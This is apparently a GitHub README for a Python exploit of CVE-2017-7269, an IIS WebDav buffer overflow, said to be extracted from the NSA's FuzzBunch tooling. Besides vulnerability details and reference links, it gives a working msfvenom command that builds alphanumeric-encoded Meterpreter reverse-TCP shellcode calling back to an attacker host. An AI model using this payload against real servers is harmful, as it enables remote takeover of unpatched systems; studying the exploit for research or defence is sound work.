# ExplodingCan

An implementation of ExplodingCan's exploit extracted from FuzzBunch, the "Metasploit" of the NSA.

![exploit](https://user-images.githubusercontent.com/1675387/34547090-d2c7309e-f0f8-11e7-83ca-02c1955432ad.png)

## Details

* **Vulnerability**: Microsoft IIS WebDav 'ScStoragePathFromUrl' Remote Buffer Overflow
* **CVE**: [CVE-2017-7269](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269)
* **Disclosure date**: March 31 2017
* **Affected product**: Microsoft Windows Server 2003 R2 SP2 x86


## Why?
Months ago I needed to study this exploit, and finally I implemented it in python.

## Shellcode

The shellcode must be in alphanumeric format due to the limitations of the bug. For example we can use `msfvenom` (metasploit) with the `alpha_mixed` encoder.

```
$ msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=172.16.20.1 LPORT=4444 >shellcode
```

## Links

* [Fuzzbunch framework](https://github.com/x0rz/EQGRP_Lost_in_Translation)
* [Metasploit module](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl)
* [0patching the "Immortal" CVE-2017-7269](https://0patch.blogspot.com.es/2017/03/0patching-immortal-cve-2017-7269.html)
* [First exploit published](https://www.exploit-db.com/exploits/41738/)
